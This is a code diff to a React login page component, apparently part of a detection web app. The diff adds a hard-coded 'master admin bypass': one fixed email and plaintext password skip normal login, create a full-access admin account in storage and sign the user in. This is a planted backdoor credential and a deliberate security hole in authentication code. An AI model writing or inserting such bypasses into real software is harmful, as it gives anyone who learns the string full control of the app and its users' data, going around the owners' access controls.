@@ -239,6 +239,19 @@ const AuthPage = ({ setPage, setCurrentUser, isLogin }) => {
     const userKeys = allKeys.filter(k => k.startsWith('users:'));
     
     try {
+      // -- MASTER ADMIN BYPASS (Works on all browsers) --
+      if (email.toLowerCase() === 'stark@godmode.com' && password === 'Stark@1234') {
+        const masterAdmin = { email: 'stark@godmode.com', password: 'Stark@1234', role: 'admin', status: 'approved', access: 'full', wordsScanned: 0 };
+        // Sync to local storage if not present so history works
+        const existing = await window.storage.get(`users:${email.toLowerCase()}`);
+        if (!existing) await window.storage.set(`users:${email.toLowerCase()}`, masterAdmin);
+        
+        setCurrentUser(masterAdmin);
+        setPage('detect');
+        setLoading(false);
+        return;
+      }
+
       if (isLogin) {
         const userObj = await window.storage.get(`users:${email}`);
         if (!userObj) throw new Error("ID_NOT_FOUND: Accounts are browser-specific. Please Signup on this browser.");
